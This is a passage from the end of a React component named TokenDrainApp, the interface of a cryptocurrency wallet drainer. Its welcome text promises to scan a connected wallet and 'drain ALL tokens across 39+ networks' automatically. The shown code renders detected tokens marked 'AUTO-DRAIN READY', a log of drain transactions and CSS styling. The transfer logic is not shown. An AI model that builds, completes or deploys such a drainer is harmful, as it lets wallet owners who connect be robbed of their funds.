                      {transactions.filter(t => t.status?.includes('✅')).length} / {transactions.length} successful
                    </div>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, idx) => (
                      <div key={tx.id || idx} className={`transaction-item ${tx.status?.includes('✅') ? 'success' : 'failed'}`}>
                        <div className="tx-icon">
                          {tx.status?.includes('✅') ? '✅' : '❌'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-network">{tx.network}</span>
                            <span className="tx-amount">{formatAmount(tx.amount)}</span>
                            <span className="tx-value">${tx.valueUSD || '0'}</span>
                          </div>
                          <div className="tx-secondary">
                            <span className="tx-status">{tx.status}</span>
                            <span className="tx-message">{tx.message}</span>
                          </div>
                          {tx.explorer && (
                            <a href={tx.explorer} target="_blank" rel="noopener noreferrer" className="tx-link">
                              View Transaction
                            </a>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Detected Tokens */}
              {tokens.length > 0 ? (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>DETECTED TOKENS (AUTO-DRAIN READY)</h3>
                    <div className="panel-summary">
                      <span>${totalValue.toFixed(2)} total value</span>
                      <span>{tokens.length} tokens</span>
                      <span>{[...new Set(tokens.map(t => t.network))].length} networks</span>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div 
                            className="network-badge"
                            style={{ 
                              backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666'
                            }}
                          >
                            {token.symbol}
                          </div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'EVM' : 'NON-EVM'}
                          </div>
                        </div>
                        <div className="token-amount">
                          {formatAmount(token.amount)} {token.symbol}
                        </div>
                        <div className="token-value">
                          ${token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
                        </div>
                        <div className="token-status">
                          <span className="status-auto">⚡ AUTO-DRAIN READY</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : !isScanning ? (
                <div className="empty-state">
                  <div className="empty-icon">💎</div>
                  <h3>No tokens detected yet</h3>
                  <p>Auto-scan will detect TRON, Bitcoin, Solana, and all EVM tokens</p>
                </div>
              ) : null}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>UNIVERSAL AUTO-DRAINER</h2>
                <p className="welcome-text">
                  Connect your wallet to automatically scan and drain ALL tokens across 39+ networks. 
                  TRON, Bitcoin, Solana, and all EVM chains are fully supported with auto-drain.
                </p>
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                <div className="features">
                  <div className="feature">• AUTO-SCAN 39+ networks instantly</div>
                  <div className="feature">• AUTO-DRAIN ALL tokens (EVM + non-EVM)</div>
                  <div className="feature">• Detects TRON, Bitcoin, Solana automatically</div>
                  <div className="feature">• No manual steps - fully automated</div>
                  <div className="feature">• Mobile wallet compatible (Trust, MetaMask)</div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span>UNIVERSAL AUTO-DRAINER • NO MANUAL STEPS • 100% AUTOMATED</span>
            <span className="status-dot"></span>
            <span>{isConnected ? (isScanning ? 'AUTO-SCANNING...' : isProcessing ? 'AUTO-DRAINING...' : 'READY') : 'CONNECT WALLET'}</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); opacity: 1; }
          50% { transform: scale(1.05); opacity: 0.8; }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .scan-progress {
          font-size: 12px;
          color: #aaa;
          margin-top: 5px;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          margin-bottom: 25px;
        }
        
        .control-buttons {
          display: flex;
          gap: 15px;
          margin-bottom: 15px;
        }
        
        .btn {
          flex: 1;
          padding: 16px 20px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn-scan {
          background: linear-gradient(45deg, #3b82f6, #60a5fa);
          color: white;
        }
        
        .btn-drain {
          background: linear-gradient(45deg, #ef4444, #f87171);
          color: white;
        }
        
        .btn:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .spinner {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-radius: 50%;
          border-top-color: white;
          animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .drain-summary {
          background: #222;
          border-radius: 12px;
          padding: 15px;
          text-align: center;
        }
        
        .summary-text {
          color: #ddd;
          margin-bottom: 8px;
        }
        
        .summary-text strong {
          color: white;
        }
        
        .summary-breakdown {
          display: flex;
          justify-content: center;
          gap: 20px;
          font-size: 14px;
        }
        
        .network-count {
          color: #10b981;
        }
        
        .tron-count {
          color: #ff6b6b;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          color: white;
          min-width: 60px;
        }
        
        .tx-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
          min-width: 80px;
          text-align: right;
        }
        
        .tx-value {
          color: #10b981;
          font-weight: 600;
          min-width: 70px;
          text-align: right;
        }
        
        .tx-secondary {
          display: flex;
          justify-content: space-between;
          color: #888;
          font-size: 14px;
          margin-bottom: 5px;
        }
        
        .tx-status {
          font-weight: 600;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-link {
          color: #3b82f6;
          font-size: 12px;
          text-decoration: none;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
          margin-bottom: 20px;
          flex-wrap: wrap;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.2s;
        }
        
        .token-card:hover {
          transform: translateY(-3px);
          border-color: #444;
          box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 15px;
        }
        
        .network-badge {
          padding: 5px 10px;
          border-radius: 20px;
          font-weight: 600;
          font-size: 14px;
          min-width: 50px;
          text-align: center;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 3px 8px;
          border-radius: 6px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 15px;
        }
        
        .token-status {
          display: flex;
          justify-content: center;
        }
        
        .status-auto {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: 600;
        }
        
        /* Empty State */
        .empty-state {
          text-align: center;
          padding: 60px 20px;
          background: #222;
          border-radius: 16px;
          border: 1px solid #333;
        }
        
        .empty-icon {
          font-size: 48px;
          margin-bottom: 20px;
        }
        
        .empty-state h3 {
          margin: 0 0 10px 0;
          font-size: 24px;
          color: white;
        }
        
        .empty-state p {
          color: #888;
          margin-bottom: 30px;
          line-height: 1.6;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 500px;
          margin: 0 auto;
        }
        
        .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
          display: flex;
          align-items: center;
        }
        
        .feature:before {
          content: '•';
          color: #ef4444;
          margin-right: 10px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-row {
            flex-direction: column;
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 5px;
            align-items: flex-end;
          }
          
          .tx-main {
            flex-wrap: wrap;
            gap: 5px;
          }
          
          .panel-summary {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
